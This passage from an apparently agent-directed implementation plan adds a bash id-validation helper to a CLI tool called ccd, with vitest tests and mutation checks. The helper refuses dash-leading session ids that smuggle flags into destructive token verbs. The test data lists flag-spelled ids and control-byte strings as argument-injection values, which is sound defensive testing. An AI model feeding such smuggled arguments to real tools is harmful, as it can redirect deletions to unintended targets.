  return listing(home).filter((n) => n !== journal).sort();
}

/** A UTF-8 locale whose `[A-Za-z]` admits `é` under bash's `=~`, or '' (the case then skips). Found by MEASURING
 *  that property through the caller's own contained shell, never by a locale's name, the way `wideDigitLocale`
 *  finds its digit-widening locale. Assigning `LC_ALL` in bash takes effect at once, so the subshell measures
 *  exactly what a `pre` of `LC_ALL=<loc>;` does to a sourced helper. */
export function wideLetterLocale(h: { sh(snippet: string): string }): string {
  return h.sh(`for l in $(locale -a 2>/dev/null | grep -iE 'utf-?8$'); do`
    + ` ( LC_ALL=$l; [[ "é" =~ ^[A-Za-z]$ ]] ) 2>/dev/null && { printf '%s' "$l"; break; }; done; true`);
}
```

- [ ] **Step 3: Write the failing test `server/test/ccd-reg-id-ok.test.ts`**

```ts
// server/test/ccd-reg-id-ok.test.ts
//
// `_reg_id_ok`, THE ONE RULE FOR AN ID A VERB MAY BIND (path-identity spec §2.4). A dash-leading word is a flag
// spelling: every decision flag the server appends after an id begins `--`, so an id that spells one is how a verb
// came to act on the session the flag's VALUE names (spec §2.1, §2.2). This file pins the helper alone, as a truth
// table through the sourced ccd. The verbs that call it are pinned in their own files.
//
// What it must NOT refuse is pinned beside what it must: a dot-leading id still passes, because the dot rule
// belongs to the token verbs and their audits (spec §2.6), and the `--session` verbs keep accepting what they
// accept today.
//
// FIXTURE HOME ONLY: one `makeCcdHarness` HOME for the whole file. Nothing here writes a row or runs a verb.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { CCD, makeCcdHarness, type CcdHarness } from './ccdWsHelpers.js';
import { DASH_IDS, wideLetterLocale } from './dashIdFixture.js';

/** The definition line's shape, with or without the `function` keyword. A call never carries the parentheses. */
const REG_ID_OK_DEF = /^\s*(?:function\s+)?_reg_id_ok\s*\(\s*\)/;
const ccdLines = (): string[] => fs.readFileSync(CCD, 'utf8').split('\n');
/** One shell word, single-quoted. */
const sq = (s: string): string => `'${s.replaceAll("'", `'\\''`)}'`;

describe('_reg_id_ok: the id a verb may bind is never dash-leading (path-identity spec §2.4)', () => {
  let h: CcdHarness;
  beforeAll(() => { h = makeCcdHarness('ccrc-reg-id-ok-'); });
  afterAll(() => { h.cleanup(); });

  /** `_reg_id_ok`'s rc for each word, keyed by the word. ONE sourced shell answers them all; `pre` runs first. */
  const rcOf = (words: readonly string[], pre = ''): Record<string, number> => {
    const out = h.sh(`${pre} for w in ${words.map(sq).join(' ')}; do _reg_id_ok "$w"; printf '%s\\n' "$?"; done`);
    const rcs = out === '' ? [] : out.split('\n');
    expect(rcs, `one rc line per word, and nothing else on stdout:\n${out}`).toHaveLength(words.length);
    return Object.fromEntries(words.map((w, i) => [w, Number(rcs[i])]));
  };
  const each = (words: readonly string[], rc: number): Record<string, number> =>
    Object.fromEntries(words.map((w) => [w, rc]));

  it('accepts every id ccd mints', () => {
    // `claude-a-demo` is the harness roster's wrapper plus a project, as `ccd-workspaces.test.ts` composes it.
    // `a--b` is an inner double dash, which a wrapper ending in `-` may legally compose.
    const MINTED = ['demo-quiet-basin', 'claude-a-demo', 'p.v2-quiet-mesa', 'a--b'];
    expect(rcOf(MINTED)).toEqual(each(MINTED, 0));
  });

  it('refuses every flag spelling the server\'s builders append', () => {
    const FLAGS = [...DASH_IDS, '-', '-x'];
    expect(rcOf(FLAGS)).toEqual(each(FLAGS, 1));
  });

  it('refuses what the registry charset refuses', () => {
    // A control byte is outside the charset too, a trailing newline included: bash's `=~` anchors `$` at the end of
    // the word, never before a final newline. The bytes are built with String.fromCharCode, so no escape is decoded.
    const ctl = (code: number): string => String.fromCharCode(code);
    const OUTSIDE = ['', 'a/b', 'a b', 'a=b', `demo-quiet-basin${ctl(10)}`, `demo${ctl(9)}quiet`, `demo${ctl(27)}[0m`];
    expect(rcOf(OUTSIDE)).toEqual(each(OUTSIDE, 1));
    // No argument at all is refused too. Under ccd's own `set -u` the helper neither dies nor prints: it is a
    // predicate, and every caller writes its own refusal.
    expect(h.sh(`_reg_id_ok; printf '%s' "$?"`), 'no argument').toBe('1');
    expect(h.sh(`{ _reg_id_ok --actor; _reg_id_ok demo-quiet-basin; _reg_id_ok ''; _reg_id_ok; } 2>&1; printf '%s' alive`),
      'it printed something, or a call ended the shell').toBe('alive');
  });

  it('accepts a dot-leading id: the dot rule belongs to the token verbs alone', () => {
    // The token verbs and their audits refuse a dot-leading id at their own entries (spec §2.6). Folding that rule
    // in here would narrow the `--session` verbs, which accept `.hidden` today.
    expect(rcOf(['.hidden'])).toEqual({ '.hidden': 0 });
  });

  it('refuses a non-ASCII letter even under a locale whose ranges admit it', (ctx) => {
    const loc = wideLetterLocale(h);
    if (loc === '') { ctx.skip(); return; }
    const pre = `LC_ALL=${loc};`;
    expect(h.sh(`${pre} [[ 'é-x' =~ ^[A-Za-z0-9._-]+$ ]]; printf '%s' "$?"`),
      `CONTROL: under ${loc} the bare charset admits é-x, so this row can see the shadow`).toBe('0');
    expect(rcOf(['é-x'], pre)).toEqual({ 'é-x': 1 });
  });

  it('carries local LC_ALL=C in its own body', () => {
    // BEHAVIOUR FIRST, and soft, so a non-local shadow reports its leak beside the text pin below. The property is
    // that the caller's locale is restored when the local goes out of scope: the caller keeps counting what it
    // counted (the `_lc_dec_ok` pin in `ccd-actor-flags.test.ts` has the same shape).
    const out = h.sh(`LC_ALL=C.UTF-8; s=$'caf\\u00e9'; before=\${#s}; _reg_id_ok "$s"; after=\${#s}; `
      + `printf '%s %s' "$before" "$after"`);
    const [before, after] = out.split(' ');
    expect.soft(after, 'the helper leaked its LC_ALL into the caller').toBe(before);
    expect.soft(before, 'under the locale this snippet pinned, and only there').toBe('4');
    // THE TEXT PIN: deterministic on any box, including one with no locale that widens a range.
    const defs = ccdLines().filter((l) => REG_ID_OK_DEF.test(l));
    expect(defs, 'one definition line').toHaveLength(1);
    expect(defs[0], 'the shadow is in the body, so no caller locale decides the charset').toContain('local LC_ALL=C');
  });

  it('is defined exactly once', () => {
    const ccdDir = path.dirname(CCD);
    const files = fs.readdirSync(ccdDir, { encoding: 'utf8', recursive: true })
      .map((f) => path.join(ccdDir, f))
      .filter((f) => !f.endsWith('.md') && fs.statSync(f).isFile());
    const holders = files.flatMap((f) => fs.readFileSync(f, 'utf8').split('\n')
      .flatMap((l, i) => (REG_ID_OK_DEF.test(l) ? [`${path.relative(ccdDir, f)}:${i + 1}`] : [])));
    expect(holders.map((x) => x.replace(/:\d+$/, '')), `definitions:\n${holders.join('\n')}`).toEqual(['ccd']);
    // WHERE: below every line the compaction-card corpus cites, and above the temp-root id predicate's comment
    // block. Later definitions of the same family may stand between the two, never above this one.
    const lines = ccdLines();
    const at = lines.findIndex((l) => REG_ID_OK_DEF.test(l));
    const above = lines.findIndex((l) => l.startsWith('_ws_tmproot_witness_file() {'));
    const below = lines.findIndex((l) => l.startsWith('# THE ID A WITNESS MAY BE NAMED FOR'));
    expect(above, 'anchor: _ws_tmproot_witness_file').toBeGreaterThan(-1);
    expect(at, 'below _ws_tmproot_witness_file').toBeGreaterThan(above);
    expect(below, 'above the temp-root id predicate\'s comment block').toBeGreaterThan(at);
  });
});
```

- [ ] **Step 4: Run it and see it fail**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-reg-id-ok.test.ts)
```

Timeout 600000 ms, in the foreground. Expected: FAIL. Six cases are red, and the locale case is red, or skipped when the box has no wide-letter locale. Record which.
- `accepts every id ccd mints`: `expected { 'demo-quiet-basin': 127, 'claude-a-demo': 127, 'p.v2-quiet-mesa': 127, 'a--b': 127 } to deeply equal { …: 0 }`. 127 is bash's "command not found".
- `refuses every flag spelling…`: `expected { '--actor': 127, … } to deeply equal { '--actor': 1, … }`.
- `refuses what the registry charset refuses`: `expected { '': 127, 'a/b': 127, 'a b': 127, 'a=b': 127 } to deeply equal { …: 1 }`.
- `accepts a dot-leading id…`: `expected { '.hidden': 127 } to deeply equal { '.hidden': 0 }`.
- `refuses a non-ASCII letter…`: the CONTROL is green, then `expected { 'é-x': 127 } to deeply equal { 'é-x': 1 }`, or skipped.
- `carries local LC_ALL=C…`: the two soft checks are green; then `one definition line: expected [] to have a length of 1 but got +0`.
- `is defined exactly once`: `expected [] to deeply equal [ 'ccd' ]`.

The red texts were drafted, not measured: record the measured text in the SDD ledger. A case that is GREEN here is a broken test: fix the test before going on, never the expectation.

- [ ] **Step 5: Insert `_reg_id_ok` in `ccd/ccd`**

Locate the content anchor (Step 1's (t1-d) and (t1-e)). Before:

```bash
_ws_tmproot_witness_file() { printf '%s' "$REG/tmproots/${1-}"; }   # id -> the witness's path (a path, not a decision)

# THE ID A WITNESS MAY BE NAMED FOR: the tail's own id shape, never
# dot-leading — `.`, `..` and the writer's `.<id>.*.tmp` names live there.
_ws_tmproot_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]; }
```

After (four new lines: two comment lines, the definition and one blank line; every other line is byte-identical):

```bash
_ws_tmproot_witness_file() { printf '%s' "$REG/tmproots/${1-}"; }   # id -> the witness's path (a path, not a decision)

# THE ID A VERB MAY BIND (path-identity spec §2.4): the registry charset, read under LC_ALL=C, and never
# dash-leading, because a dash-leading word is a flag spelling and every decision flag the server appends begins `--`.
_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it

# THE ID A WITNESS MAY BE NAMED FOR: the tail's own id shape, never
# dot-leading — `.`, `..` and the writer's `.<id>.*.tmp` names live there.
_ws_tmproot_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]; }
```

Add no caller. `_ws_tmproot_id_ok` is Task 5's to re-derive, so this task does not touch it.

- [ ] **Step 6: Restamp and check the edit's shape**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"   # rc=0
git diff --numstat -- ccd/ccd                       # 5	1	ccd/ccd   (four lines in, and the stamp line rewritten)
grep -c '_reg_id_ok' ccd/ccd                        # 1: the definition only; no caller yet
grep -n '^_reg_id_ok() {' ccd/ccd                   # one line, at (t1-e)'s old line + 2
grep -n '^# THE ID A WITNESS MAY BE NAMED FOR' ccd/ccd   # one line, at (t1-e)'s old line + 4
```

Never edit line 2 by hand. If the restamp fails, **STOP** and report `restamp-failed` with its output.

- [ ] **Step 7: Run it green**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-reg-id-ok.test.ts)
```

Expected: PASS, 7 tests, or 6 with 1 skipped where the box has no wide-letter locale. Record which in the ledger. A skip there means the T1.2 locale red below cannot be shown on this box, and the text pin carries that rule alone.

- [ ] **Step 8: Mutation table.** Apply each mutation alone, run the file, see the red, and restore. Each row is ONE Bash call, because shell state does not persist between calls. Paste the two fixed lines below, then the row's `MUT=` line, then the run line. The restore is the inverse swap. `mark.mjs --check` exiting 0 afterwards proves the file is byte-identical to the stamped one. The red texts were drafted, not measured: record what you measure.

Fixed lines (identical in every row):

```bash
SWAP='const fs=require("fs");const [a,b]=process.argv.slice(1);const s=fs.readFileSync("ccd/ccd","utf8");if(s.split(a).length!==2)throw new Error("not exactly one line: "+a);fs.writeFileSync("ccd/ccd",s.replace(a,()=>b))'
ORIG='_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it'
```

Run line (after the row's `MUT=`):

```bash
node -e "$SWAP" "$ORIG" "$MUT" && (cd server && ./node_modules/.bin/vitest run test/ccd-reg-id-ok.test.ts); node -e "$SWAP" "$MUT" "$ORIG"; node shared/mark.mjs --check ccd/ccd; echo "restored rc=$?"
```

| # | `MUT=` (the whole mutated line) | Expected red |
|---|---|---|
| T1.1 | `MUT='_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ ]]; }   # word -> 0 iff a --session or positional id may bind it'` (the dash clause deleted) | `refuses every flag spelling…`: `expected { '--actor': 0, '--surface': 0, …, '-': 0, '-x': 0 } to deeply equal { '--actor': 1, … }`. Every other case is green |
| T1.2 | `MUT='_reg_id_ok() { [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it'` (`local LC_ALL=C;` deleted) | `carries local LC_ALL=C…`: `the shadow is in the body…: expected '_reg_id_ok() { [[ "${1-}" =~ …' to contain 'local LC_ALL=C'`. Where a wide-letter locale exists, also `refuses a non-ASCII letter…`: `expected { 'é-x': 0 } to deeply equal { 'é-x': 1 }` |
| T1.3 | `MUT='_reg_id_ok() { local LC_ALL=C; [[ "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it'` (the regex clause deleted) | `refuses what the registry charset refuses`: `expected { '': 0, 'a/b': 0, 'a b': 0, 'a=b': 0 } to deeply equal { …: 1 }`. Where a wide-letter locale exists, also the locale row (`{ 'é-x': 0 }`) |
| T1.4 | `MUT='_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* && "${1-}" != .* ]]; }   # word -> 0 iff a --session or positional id may bind it'` (a dot rule added) | `accepts a dot-leading id…`: `expected { '.hidden': 1 } to deeply equal { '.hidden': 0 }` |
| T1.5 | `MUT='_reg_id_ok() { LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it'` (the shadow made global) | `carries local LC_ALL=C…`: the soft `the helper leaked its LC_ALL into the caller: expected '5' to be '4'`, then the text pin's `expected '_reg_id_ok() { LC_ALL=C; …' to contain 'local LC_ALL=C'` |

Every row must end with `restored rc=0`. If any does not, **STOP**: do not restamp over a mutated file. Restore by re-running that row's inverse swap, or `git checkout -- ccd/ccd` and redo Steps 5 and 6.

After all five rows, re-run Step 7's command: green.

- [ ] **Step 9: The gates: stamp, corpus, containment, types and start lines**

```bash
(cd server && ./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts)
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
grep -n "'ccd/ccd': [0-9]*," server/test/session-hook.test.ts      # the same line and number as Task 0's (c1); this task edits no number
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'routes EVERY bash call site')
(cd server && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts -t 'server/test/ is clean')
```

Expected: every run PASSES.
- The new file's name matches `/^ccd.*\.ts$/`, so the containment case reads it. It spawns no bash of its own; every call goes through `h.sh`.
- `typecheck-tests` checks both new files. It is a CLAUDE.md load flake, so re-run it alone before calling a red a break.
- If a citation pass goes red, the insertion moved a line a corpus document cites. Never edit a number to go green. **STOP** and report `reg-id-ok-insertion-moves-a-cited-line`, with the failing anchors from the pass's output.

The start-line measure. Run it as one call from the workspace root:

```bash
awk -F: 'NR==FNR{m[$2]=$1; next} ($2 in m){d=$1-m[$2]; if(!s || d!=last){print $2" delta="d; last=d; s=1}}' \
  <(git show origin/main:ccd/ccd | grep -nE '^[A-Za-z_][A-Za-z0-9_]*\(\) *\{' | sed 's/() *{.*//') \
  <(grep -nE '^[A-Za-z_][A-Za-z0-9_]*\(\) *\{' ccd/ccd | sed 's/() *{.*//')
```

Expected: exactly two lines.
- The file's first function at delta 0 (`_plat_mv_notdir delta=0` at the export).
- `_ws_tmproot_id_ok delta=4`.

So every function above the insertion keeps its `origin/main` line, every function from `_ws_tmproot_id_ok` on moves by exactly 4, and `_reg_id_ok` itself, absent on `origin/main`, prints nothing. Record both lines in the ledger. A third line means a line moved somewhere this task did not edit: **STOP** and report `reg-id-ok-moved-an-unedited-line`.

- [ ] **Step 10: Commit**

```bash
git add ccd/ccd server/test/dashIdFixture.ts server/test/ccd-reg-id-ok.test.ts
git commit -F - <<'EOF'
fix(ccd): _reg_id_ok, the one rule for an id a verb may bind (path-identity W1b)

A dash-leading word is a flag spelling: every decision flag the server
appends after an id begins with two dashes. _reg_id_ok answers whether a
--session or positional id may bind a word: the registry charset, read
under LC_ALL=C in its own body, and never a leading dash. A dot-leading
id still passes, because the dot rule stays with the token verbs and
their audits.

It has no caller yet; the later tasks of this wave route every post-loop
id check through it. It sits directly above the temp-root id predicate's
comment block, below every line the compaction-card corpus cites, and
edits no existing function.

dashIdFixture.ts holds the flag-spelled ids and the decoy surface words
the wave's suites share, plants a registry row with node:fs so an id may
spell a flag, lists the reap locks and the registry, and finds a locale
whose letter ranges admit a non-ASCII letter by measuring it.
EOF
git log -1 --format=%B | grep -cE 'D-[0-9]'        # 0
```

---

### Task 2: The token verbs take `--session` and their token keys whole, and refuse a dash-leading id

**Model routing:** **`opus`, effort `xhigh`** (SAFETY).

**Why:** these three verbs delete. Today:
- **An id of `--actor`, `--surface` or `--reason` rebinds at the parse.**
  - The server appends its decision flags after the id.
  - The dec arm eats the next token as its value, and the sweeps' surface word, `agent`, falls into the residue and binds as the id.
- **An id of `--expect`, `--child-of`, `--defer-expired`, `--session` or `--branch` stays literal.**
  - It passes the inline id regex and creates a permanent `$REG/.reap---<x>.lock` before the token refuses (spec §2.2).
  - Reap locks are never unlinked (spec §2.5).

This task:
- adds one identity arm per loop (R17: the pair goes to the residue, a lone key goes alone, and the arm refuses nothing);
- rewrites the three entry lines (R16: `_reg_id_ok` at ws-reclaim and ws-expire, `_reg_id_ok` beside `_ws_tmproot_id_ok` at ws-collect).

Task 8 owns the dot rule and later rewrites all three entries. No dot-leading row belongs here (R16).

Every prediction below was made at planning, on the read-only export, and is unmeasured. A different count is not a departure, but a different KIND of failure is: report it by slug. Record every measured red text in the SDD ledger, `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md`.

**Files:**
- **Modify `ccd/ccd`.** All three functions start below `cmd_start()`, so lines may be added (Global Constraints). Locate each by content.
  - Line hints are at the export `837a099c0`. Task 1's insertion above `# THE ID A WITNESS MAY BE NAMED FOR` moves all of them down, and #351 moves `cmd_ws_collect` by 14 more.
  - **`cmd_ws_reclaim`** (`grep -n '^cmd_ws_reclaim() {' ccd/ccd`; hint `:31004`):
    - Insert a three-line comment and the identity arm directly above `      --defer-expired) defer=1; shift ;;`.
    - The entry line `  [[ $id =~ ^[A-Za-z0-9._-]+$ ]]         || die "bad session id"` (hint `:31049`) becomes `_reg_id_ok "$id"`.
    - Its header comment ("THE SESSION ID IS VALIDATED FIRST") gains one clause.
  - **`cmd_ws_expire`** (hint `:31840`). This edit is under workspace-lifecycle's consent, recorded at Task 0 Step 6.
    - Insert a two-line comment and the arm directly above its `--surface)` arm.
    - The entry line (hint `:31876`) becomes `_reg_id_ok "$id"`, with a one-line comment above it.
    - `_ws_expire_locked` and `_ws_expire_audit_contained` are NOT touched.
  - **`cmd_ws_collect`** (hint `:34017`, `:34031` after #351):
    - Insert a two-line comment and the arm directly above its `--surface)` arm.
    - The entry line (hint `:34053`, `:34067` after #351) becomes `_reg_id_ok "$id" && _ws_tmproot_id_ok "$id"`, with a one-line comment above it.
  - Then restamp with `bash ccd/ccrc restamp ccd/ccd`.
- **Create `server/test/ccd-token-verbs-dash-id.test.ts`.**
- **Run, never edit:**
  - the scans: `ccd-refusal-scan`, `collect-readers`, `child-reclaim`, `archived-expiry-policy`, `ccd-wsaudit-nonpoison`, `wsaudit`;
  - the parity and reclaim suites: `ccdargv-dec-parity`, `ccd-child-reclaim-verb`, `ccd-child-reclaim-prelock-journal`, and every other file that calls `cmd_ws_reclaim`, `cmd_ws_expire` or `cmd_ws_collect`, directly or through `childReclaimVerb`, `expireVerb` or `collectVerb`. Step 7 lists them, as measured at the export by `grep -lE 'cmd_ws_(reclaim|expire|collect) |childReclaimVerb\(|expireVerb\(|collectVerb\(' server/test/*.test.ts`;
  - the expire suites: `ccd-ws-expire-verb`, `ccd-ws-expire-ladder`, `ccd-ws-expire-return-race`, `ccd-lifecycle-purge`;
  - every `ccd-ws-collect-*` and `ccd-collect-*` file;
  - the guards: `session-hook`'s five passes, `ccd-workspaces`' spawn census case, `ownership`, `mark-check`, `typecheck-tests`.

**Interfaces:**
- **Consumes, from Task 1:**
  - `_reg_id_ok WORD` in `ccd/ccd`: rc 0 iff WORD matches `^[A-Za-z0-9._-]+$` under `LC_ALL=C` and does not begin with `-`. It prints nothing and never dies.
  - From `server/test/dashIdFixture.ts`:
    ```ts
    export const DASH_IDS: readonly ['--actor', '--surface', '--reason', '--expect', '--defer-expired', '--session', '--branch', '--child-of'];
    export const DECOY_IDS: readonly ['agent', 'pwa'];
    export const regDirOf: (home: string) => string;
    export function plantRow(home: string, id: string, fields?: Readonly<Record<string, string>>): void;
    export function reapLocks(home: string): string[];
    export function regListing(home: string): string[];
    ```
- **Consumes, existing at the export:**
  - `_ws_tmproot_id_ok ID` (`ccd/ccd`). Today it is the charset plus no leading `.`; Task 5 re-derives it.
  - `server/test/ccdPrHelpers.ts`: `makePrHarness(prefix: string): PrHarness`, with `home`, `sh(snippet)`, `run(snippet): { code: number; stdout: string; stderr: string }`, `calls(): string[]` and `cleanup()`.
  - `server/test/childReclaimFixture.ts`:
    - `CHILD_ID = 'demo-quiet-basin'`, `CHILD_RUN = 7`, `CHILD_STUBS: string`, `CHILD_ENV: string`;
    - `makeChild(h: PrHarness): Child`;
    - `childReclaimVerb(h: PrHarness, token: string, opts?: { childOf?: number; extra?: string; pre?: string }): { code: number; stdout: string; stderr: string }`.
  - `server/test/wsExpireFixture.ts`:
    - `EXP_ID = 'demo-quiet-dune'`, `EXP_STUBS: string`;
    - `makeArchived(h: PrHarness, archivedAt?: number): Archived`;
    - `expireVerb(h: PrHarness, token: string, opts?: { extra?: string; pre?: string }): { code: number; stdout: string; stderr: string }`.
  - `server/test/wsCollectFixture.ts`:
    - `COL_ID = 'demo-quiet-reef'`, `WRONG_TOKEN = '0'.repeat(64)`;
    - `makeOrphan(h: PrHarness): Orphan`;
    - `collectVerb(h: PrHarness, token: string, opts?: { pre?: string; extra?: string; id?: string; floor?: boolean }): Run`;
    - `docOf(stdout: string): Record<string, unknown>`.
  - `server/test/lifecycleHelpers.ts`: `readJournal(home: string): Record<string, unknown>[]`, `eventsOf(home: string, act: string): Record<string, unknown>[]` and `decOf(e: Record<string, unknown>): Record<string, string>`.
- **Produces** (`ccd/ccd`, exact text, each ONE line and the first pattern of its `case`):
  ```bash
  # ws-reclaim:
        --expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
  # ws-expire, ws-collect:
        --expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
  ```
  The entry lines:
  ```bash
    _reg_id_ok "$id"                       || die "bad session id"                   # ws-reclaim, ws-expire
    _reg_id_ok "$id" && _ws_tmproot_id_ok "$id"               || die "bad session id"   # ws-collect
  ```
- **File-local test names** (not shared; no later task reads them): `TokenVerbCase`, `RECLAIM`, `EXPIRE`, `COLLECT`, `REBINDING`, `LITERAL`, `Snapshot`, `setup`, `sharedCases`, `decoyNames`.

- [ ] **Step 0: Entry conditions (Task 1 is committed; measure, never assume)**

Run from the workspace root:

```bash
grep -n '^_reg_id_ok() {' ccd/ccd                                                          # (t1) one line: Task 1's helper
grep -n '^cmd_ws_reclaim() {\|^cmd_ws_expire() {\|^cmd_ws_collect() {' ccd/ccd               # (t2) three lines
grep -n -- '--defer-expired) defer=1; shift ;;' ccd/ccd                                     # (t3) one line, inside cmd_ws_reclaim
grep -c -- '--expect|--child-of|--session)\|--expect|--session)' ccd/ccd                    # (t4) 0: no identity arm yet
awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) \{/{f=$1} /^  \[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]/{print NR": "f}' ccd/ccd \
  | grep 'cmd_ws_reclaim\|cmd_ws_expire\|cmd_ws_collect'                                     # (t5) three lines, one per verb
grep -n 'export const DASH_IDS\|export const DECOY_IDS\|export const regDirOf\|export function plantRow\|export function reapLocks\|export function regListing' server/test/dashIdFixture.ts   # (t6) six lines
grep -n 'export const CHILD_RUN\|export function childReclaimVerb' server/test/childReclaimFixture.ts; grep -n 'export function expireVerb' server/test/wsExpireFixture.ts; grep -n 'export function collectVerb\|export const docOf' server/test/wsCollectFixture.ts   # (t7) five lines
(cd server && ./node_modules/.bin/vitest run test/ccd-refusal-scan.test.ts test/collect-readers.test.ts test/child-reclaim.test.ts)   # (t8) PASS at entry
```

- If (t1), (t5) or (t6) does not print what it states, **STOP** and report the label.
- The SDD ledger's Task 0 Step 6 line must record workspace-lifecycle's consent to the ws-expire edits. Absent: **STOP**.

- [ ] **Step 1: Write the failing test** `server/test/ccd-token-verbs-dash-id.test.ts`

```ts
// Path-identity W1b (path-identity spec §2.2, §2.4): the three token verbs, ws-reclaim, ws-expire and ws-collect,
// take each identity key and its value as ONE pair, and refuse a dash-leading id at entry, before the reap lock.
//
// These are the verbs that delete. The server appends its decision flags after the id, and each loop used to scan the
// `--session` value again as a flag:
//   - an id of `--actor`, `--surface` or `--reason` lost its value to the dec arm, and the sweeps' surface word,
//     `agent`, bound as the id;
//   - an id of `--expect`, `--child-of`, `--session` or `--branch` (and, at ws-expire and ws-collect, `--defer-expired`)
//     stayed literal, passed the old id regex, and could open `$REG/.reap---<x>.lock` before the token refused (at
//     ws-reclaim, an id of `--defer-expired` was eaten by its own arm and answered the usage line). A reap lock is never unlinked
//     (path-identity spec §2.5), so each such call left one for good.
// A call that spells no id, token or run id as a flag answers as before: a lone key, a key given twice and a pair out of order still
// reach the exact-arity rule and answer the usage line, and the dec ladder still runs first.
//
// FIXTURE HOMEs ONLY. Every call runs the SOURCED function in `makePrHarness`'s HOME. `CHILD_STUBS` records the unit
// and pane calls instead of making them, and `CHILD_ENV` keeps the residue probe inside the HOME. The argv is TYPED
// here, in the order each server builder composes it (`wsReclaim`, `wsExpire` and `wsCollect` in
// server/src/ccdargv.ts). This file imports nothing from server/src; `ccdargv-dash-id-parity.test.ts` runs the
// composed argv on the real binary.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { makePrHarness, type PrHarness } from './ccdPrHelpers.js';
import { decOf, eventsOf, readJournal } from './lifecycleHelpers.js';
import { CHILD_ENV, CHILD_ID, CHILD_RUN, CHILD_STUBS, childReclaimVerb, makeChild } from './childReclaimFixture.js';
import { EXP_ID, EXP_STUBS, expireVerb, makeArchived } from './wsExpireFixture.js';
import { COL_ID, WRONG_TOKEN, collectVerb, docOf, makeOrphan } from './wsCollectFixture.js';
import { DASH_IDS, DECOY_IDS, plantRow, reapLocks, regDirOf, regListing } from './dashIdFixture.js';

let h: PrHarness;
beforeEach(() => { h = makePrHarness('ccrc-token-verbs-dash-id-'); });
afterEach(() => { h.cleanup(); });

const LINUX = process.platform === 'linux';
/** Well-formed, so ws-expire's and ws-collect's token check, which runs BEFORE their id check, passes and the id check
 *  is what answers. Under a mutant that lets the id through, the verb goes on and opens the reap lock, where it shows. */
const TOK = 'a'.repeat(64);
/** The dec the sweeps append (`decFlags`), without and with a reason. */
const DEC = '--surface agent --actor x';
const DEC_R = '--surface agent --actor x --reason r';
/** The ids a dec arm used to take the value of, leaving the surface word to bind (spec §2.2). */
const REBINDING: readonly string[] = ['--actor', '--surface', '--reason'];
/** The rest of `DASH_IDS`: each stayed literal and opened `.reap---<x>.lock`. `--branch` is among them: no token verb
 *  has that key, so it was literal too. */
const LITERAL: readonly string[] = DASH_IDS.filter((d) => !REBINDING.includes(d));
const q = (s: string): string => `'${s}'`;
const linesOf = (s: string): string[] => s.split('\n');
const isDecoy = (id: unknown): boolean => (DECOY_IDS as readonly string[]).includes(String(id));
/** The registry names that belong to a decoy: its rows, and any reap lock taken for it. */
const decoyNames = (home: string): string[] =>
  regListing(home).filter((n) => DECOY_IDS.some((d) => n.startsWith(`${d}.`) || n === `.reap-${d}.lock`));

interface TokenVerbCase {
  /** The journal act this verb's refusals are written under. */
  readonly act: 'reclaim' | 'expire' | 'collect';
  /** Everything up to and including the function name: the recorders, the residue root, the sourced verb. */
  readonly call: string;
  /** The verb's keys before `--session <id>`, in its builder's order. */
  readonly head: (token: string) => string;
  /** What the server appends after the id: the dec, without and with a reason, and for ws-reclaim also with the
   *  `--defer-expired` that `deferFlags` puts before the dec. */
  readonly tails: readonly string[];
  /** The verb's usage literal, as its `die` prints it after `ccd: `. */
  readonly usage: string;
  /** The real id of the verb's own fixture. */
  readonly id: string;
  /** Argvs whose token or run id spells a flag, with the line the verb answers once that value is taken whole. */
  readonly flagValues: readonly (readonly [string, string])[];
}

const RECLAIM: TokenVerbCase = {
  act: 'reclaim',
  call: `${CHILD_STUBS} ${CHILD_ENV} cmd_ws_reclaim`,
  head: (token) => `--expect ${token} --child-of ${CHILD_RUN}`,
  tails: [DEC, DEC_R, `--defer-expired ${DEC}`, `--defer-expired ${DEC_R}`],
  usage: 'usage: ccd ws-reclaim --expect <token> --child-of <runId> --session <id> [--defer-expired] [--surface <word>] [--actor <text>] [--reason <text>]',
  id: CHILD_ID,
  flagValues: [
    [`--expect --surface --child-of ${CHILD_RUN} --session ${CHILD_ID} ${DEC}`, 'ccd: bad token'],
    [`--expect ${TOK} --child-of --surface --session ${CHILD_ID} ${DEC}`, 'ccd: bad run id'],
  ],
};
const EXPIRE: TokenVerbCase = {
  act: 'expire',
  call: `${EXP_STUBS} ${CHILD_ENV} cmd_ws_expire`,
